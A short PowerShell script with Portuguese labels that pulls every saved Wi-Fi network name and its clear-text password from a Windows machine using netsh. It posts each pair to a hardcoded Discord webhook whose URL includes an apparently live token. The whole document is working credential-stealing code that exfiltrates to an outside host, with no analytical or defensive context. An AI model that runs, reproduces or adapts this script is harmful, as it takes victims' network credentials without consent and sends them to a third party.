$Webhook="https://discord.com/api/webhooks/1391925819017793566/P6u2qHAbmqSFeu94T1beCpyWBO6khVVdCK66sy8a083xDZqRSyY5w5PDHDciVnh2ImDB"
$profiles = netsh wlan show profile | Where-Object { $_ -match "All User Profile" } | ForEach-Object { ($_ -split ':')[1].Trim() }
foreach ($p in $profiles) {
    $details = netsh wlan show profile name="$p" key=clear
    $passLine = $details | Select-String "Key Content"
    $password = if ($passLine) { ($passLine -split ':')[1].Trim() } else { '[Sem senha]' }
    
    $message = "📶 **Rede:** $p | **Senha:** `$password`"
    $json = @{content = $message} | ConvertTo-Json
    Invoke-RestMethod -Uri $Webhook -Method Post -Body $json -ContentType "application/json"
    Start-Sleep -Milliseconds 300
}
